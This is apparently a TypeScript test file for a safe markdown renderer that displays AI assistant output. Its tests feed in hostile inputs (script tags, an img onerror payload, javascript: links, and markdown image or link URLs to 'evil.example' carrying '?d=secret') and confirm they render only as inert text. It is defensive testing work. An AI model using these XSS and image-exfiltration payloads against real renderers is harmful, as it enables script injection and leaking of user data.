import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { parseInline } from "@/lib/forms/assist-markdown";

import { AssistMarkdown } from "./assist-markdown";

function renderMd(text: string): HTMLElement {
  return render(<AssistMarkdown text={text} />).container;
}

describe("AssistMarkdown, the safe subset", () => {
  it("renders paragraphs and line breaks", () => {
    const root = renderMd("First line\nsecond line\n\nNext paragraph");
    const paragraphs = root.querySelectorAll("p");
    expect(paragraphs).toHaveLength(2);
    expect(paragraphs[0]?.querySelectorAll("br")).toHaveLength(1);
    expect(paragraphs[1]?.textContent).toBe("Next paragraph");
  });

  it("renders bold, italic and inline code, so no literal backticks or asterisks remain", () => {
    const root = renderMd("Use **bold**, *italic* and `q_vehicle_make` here.");
    expect(root.querySelector("strong")?.textContent).toBe("bold");
    expect(root.querySelector("em")?.textContent).toBe("italic");
    expect(root.querySelector("code")?.textContent).toBe("q_vehicle_make");
    expect(root.textContent).toBe("Use bold, italic and q_vehicle_make here.");
  });

  it("never italicises inside an identifier", () => {
    const root = renderMd("Pinned q_vehicle_make_v2 and opt_yes_no.");
    expect(root.querySelector("em")).toBeNull();
    expect(root.textContent).toBe("Pinned q_vehicle_make_v2 and opt_yes_no.");
  });

  it("renders bullet and numbered lists, keeping a numbered list's start", () => {
    const root = renderMd("Steps:\n- one\n- two\n\n3. three\n4. four");
    expect(root.querySelectorAll("ul > li")).toHaveLength(2);
    const ordered = root.querySelector("ol");
    expect(ordered?.getAttribute("start")).toBe("3");
    expect(ordered?.querySelectorAll("li")).toHaveLength(2);
  });

  it("renders a fenced block as monospace text", () => {
    const root = renderMd('```json\n{ "a": 1 }\n```');
    expect(root.querySelector("pre code")?.textContent).toBe('{ "a": 1 }');
  });

  it("shows raw HTML and script as text, never as elements", () => {
    const root = renderMd('<script>alert(1)</script> <b>hi</b> <img src="x" onerror="alert(2)">');
    expect(root.querySelector("script")).toBeNull();
    expect(root.querySelector("b")).toBeNull();
    expect(root.querySelector("img")).toBeNull();
    expect(root.textContent).toContain("<script>alert(1)</script>");
    expect(root.innerHTML).not.toContain("<script>");
  });

  it("drops an image to its alt text, with no URL anywhere in the output", () => {
    const root = renderMd("Look ![a chart](https://evil.example/leak?d=secret) here");
    expect(root.querySelector("img")).toBeNull();
    expect(root.textContent).toBe("Look a chart here");
    expect(root.innerHTML).not.toContain("evil.example");
  });

  it("renders a target outside the page-route list as text, keeping no URL", () => {
    const root = renderMd(
      "See [the **docs**](javascript:alert(1)) and [away](https://evil.example/leak?d=x).",
    );
    expect(root.querySelector("a")).toBeNull();
    expect(root.querySelector("strong")?.textContent).toBe("docs");
    expect(root.textContent).toBe("See the docs and away.");
    expect(root.innerHTML).not.toContain("javascript");
    expect(root.innerHTML).not.toContain("evil.example");
  });

  /**
   * Reference-style links, which CommonMark resolves against a definition
   * elsewhere in the document.
   *
   * The subset has no link definitions at all, so `[text][label]` is two sets
   * of literal brackets and `[label]: url` is a paragraph of text. That is the
   * right answer rather than a gap: a renderer that resolved definitions would
   * have a second, separate place a URL can come from, and this one has exactly
   * one. The definition line shows its URL **as characters**, which is what the
   * author would see in the model's own prose and is not a channel: nothing
   * fetches it and nothing follows it.
   */
  it("leaves a reference-style link and its definition as literal text", () => {
    const root = renderMd("Read [the guide][g] now.\n\n[g]: https://evil.example/leak?d=secret");
    expect(root.querySelector("a")).toBeNull();
    expect(root.querySelector("img")).toBeNull();
    expect(root.textContent).toContain("[the guide][g]");
    expect(root.querySelectorAll("[href], [src]")).toHaveLength(0);
  });

  /**
   * A nested emphasis bomb: many unmatched markers, which a backtracking parser
   * can be made to spend exponential time on.
   *
   * The assertion is a wall-clock bound rather than an output shape, because
   * what matters is that a model (or an injected question title relayed through
   * one) cannot hang the author's tab. The parse is linear in the source with a
   * bounded scan per marker, so the margin here is enormous.
   */
  it("finishes promptly on a nested emphasis bomb, emitting no element", () => {
    const bomb = `${"*".repeat(400)}a${"_".repeat(400)}b${"*_".repeat(400)}`;
    const started = Date.now();
    const root = renderMd(bomb);
    expect(Date.now() - started).toBeLessThan(2_000);
    expect(root.querySelector("a")).toBeNull();
    expect(root.querySelector("img")).toBeNull();
  });

  /**
   * The link rule (080 exit criterion 7).
   *
   * The two cases that matter sit beside each other: `/forms/frm_x` is a page
   * and `/forms/frm_x/export` is the streaming download route handler, which
   * only an export card may start. Both start with the same three characters,
   * which is why the list is a closed set of route patterns and not a prefix.
   */
  const TEXT_ONLY: readonly (readonly [string, string])[] = [
    ["an export route with filters", "/forms/frm_x/export?format=csv&shape=wide"],
    ["the export route itself", "/forms/frm_x/export"],
    ["a path that is no route", "/assist"],
    ["the per-form assist route handler", "/forms/frm_x/assist"],
    ["a page path carrying a query string", "/forms/frm_x?tab=rules"],
    ["a page path carrying a fragment", "/forms/frm_x#steps"],
    ["a protocol-relative path", "//evil.example/forms"],
    ["a traversal", "/forms/../settings"],
    ["a settings route handler", "/settings/password"],
  ];

  it.each(TEXT_ONLY)("renders %s as plain text", (_name, target) => {
    const root = renderMd(`See [x](${target}).`);
    expect(root.querySelector("a")).toBeNull();
    expect(root.textContent).toBe("See x.");
    expect(root.innerHTML).not.toContain(target);
  });

  const LINKED: readonly string[] = [
    "/forms",
    "/forms/new",
    "/forms/frm_x",
    "/forms/frm_x/releases",
    "/forms/frm_x/responses/ses_y",
    "/questions/q_name",
    "/settings",
  ];

  it.each(LINKED)("renders the page route %s as a link", (target) => {
    const root = renderMd(`Open [x](${target}).`);
    const anchor = root.querySelector("a");
    expect(anchor?.getAttribute("href")).toBe(target);
    expect(anchor?.textContent).toBe("x");
  });

  it("never emits an element, an image or an external link for any hostile case", () => {
    const hostile = [
      '<script>alert(1)</script><img src="x" onerror="alert(2)">',
      "![leak](https://evil.example/p.png?d=secret)",
      "[go](javascript:alert(1))",
      "[go](https://evil.example)",
      "[ref][r]\n\n[r]: https://evil.example",
      `${"*".repeat(200)}x${"**".repeat(200)}`,
    ].join("\n\n");
    const root = renderMd(hostile);
    // No element the browser would act on, and no attribute it would fetch or
    // follow: that is the whole of what "safe" means here. A URL may remain as
    // characters where the source wrote one outside a construct, which is the
    // reference-definition line above.
    expect(root.querySelector("script, img, b, iframe, object, embed")).toBeNull();
    expect(root.querySelectorAll("a")).toHaveLength(0);
    // Asserted over the DOM rather than over `innerHTML`, because the literal
    // `<img src="x">` the first case renders AS TEXT puts those characters in
    // the serialisation while creating no attribute at all.
    expect(root.querySelectorAll("[href], [src]")).toHaveLength(0);
    // And nothing that was inside an image or a link construct survives at all.
    expect(root.textContent).not.toContain("p.png");
    expect(root.textContent).not.toContain("javascript");
  });

  it("turns a heading into a bold paragraph rather than a heading element", () => {
    const root = renderMd("## Summary\nText");
    expect(root.querySelector("h1, h2, h3, h4, h5, h6")).toBeNull();
    expect(root.querySelector("strong")?.textContent).toBe("Summary");
  });

  it("leaves an unclosed marker as text, which is how a half-streamed span looks", () => {
    expect(parseInline("a **half")).toEqual([{ kind: "text", text: "a **half" }]);
    expect(parseInline("tick ` alone")).toEqual([{ kind: "text", text: "tick ` alone" }]);
  });

  it("honours a backslash escape", () => {
    expect(parseInline("\\*not italic\\*")).toEqual([{ kind: "text", text: "*not italic*" }]);
  });

  it("places trailing content at the end of the last block", () => {
    const { container } = render(
      <AssistMarkdown text={"- a\n- b"} trailing={<span data-testid="caret" />} />,
    );
    expect(container.querySelector("li:last-child [data-testid='caret']")).not.toBeNull();
  });
});
